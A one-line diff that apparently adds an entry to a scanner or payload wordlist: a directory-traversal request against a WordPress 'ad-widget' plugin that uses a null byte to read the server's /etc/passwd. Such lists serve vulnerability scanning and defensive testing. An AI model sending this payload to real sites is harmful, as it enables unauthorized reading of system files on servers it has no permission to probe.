@@ -1,0 +1,1 @@
+/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00
